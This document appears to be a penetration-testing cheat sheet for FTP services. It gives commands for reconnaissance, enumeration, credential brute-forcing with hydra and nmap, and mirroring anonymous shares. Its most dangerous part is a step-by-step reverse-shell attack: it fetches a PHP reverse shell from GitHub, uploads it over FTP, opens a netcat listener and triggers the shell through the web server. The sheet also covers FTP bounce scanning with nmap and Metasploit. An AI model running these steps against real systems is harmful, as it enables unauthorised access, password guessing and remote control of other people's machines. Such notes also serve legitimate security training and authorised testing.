# FTP (File Transfer Protocol)

	- Default Port: 21
	- Used for transferring files from one host to another over a TCP-based network
	- FTP operates on a client-server model
	- **The protocol supports anonymous access, where users can log in with a common username like 'anonymous' or 'ftp', and authenticated access, where a username and password are required.**


### Connect Using FTP Command
```bash
ftp <target-ip> <target-port>  #target port is optional

ftp://username:password@$TARGET

lftp $TARGET #lftp is the enhanced version of ftp. It's easier to use than ftp.

```

### Recon

```bash
nmap -p 21 $TARGET

telnet $TARGET 21  # ctrl+]

nc -v $target 21
```

### Enumeration
```bash
nmap -p 21 --script ftp-features <target-ip>

gobuster dir -u ftp://<target-ip> -w <wordlist-path>
```

### Bruteforcing Credentials
```bash
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] ftp://$target

nmap -p 21 --script ftp-brute $target

```

### Exploit
```bash
mafconsole > search ftp exploit

```


### Download All Files
```bash
wget -m ftp://anonymous:anonymous@X.X.X.X


```

### Reverse Shell over Website

```bash

# 1.Download the payload

wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

# 2.Edit some variables in shell.php
$ip = '<your-local-ip>';
$port = 1234;

# 3.Connect to the FTP server and upload the payload.
ftp <target-ip>

# 4.Upload the payload you downloaded
ftp> put shell.php

# 5.Get a shell
	- Firstly, you need to open a listener on your local machine.

nc -lvnp 1234

****Then, in a web browser, navigate to "http://target.com/path/to/ftp/shell.php". This should trigger the exploit and establish a connection back to your listener, providing you with a shell on the target system.****
```


### FTP Bounce Attack
	- FTP Bounce Attack exploits the FTP protocol's ability to redirect traffic, masking the attack source. It uses an FTP server's PORT command to route data to a third party, making the attack seem to originate from the server.

How to Execute an FTP Bounce Attack:
Find an FTP server that doesn't restrict the PORT command.
Connect to the FTP server.
ftp X.X.X.X

Use the PORT command to redirect data to the target.
quote PORT target_IP,port

Initiate a file transfer or command that sends data to the target.
get filename

This command requests a file from the FTP server, which is then sent to the specified target, exploiting the bounce capability.

Bouncing with Nmap
Nmap can scan networks via FTP bounce by specifying the -b option with an FTP server that allows bouncing.

nmap -b <FTP_server>:<port> <target_network>

This scans the target network, making it appear as though the scan originates from the specified FTP server.

 Bouncing with Metasploit
Metasploit offers modules that leverage FTP bounce for various purposes. After setting up Metasploit, you can use:

use auxiliary/scanner/ftp/ftp_bounce
set RHOSTS <FTP_server>
set RPORT <FTP_port>
run

This module scans through the vulnerable FTP server to find open ports on other systems.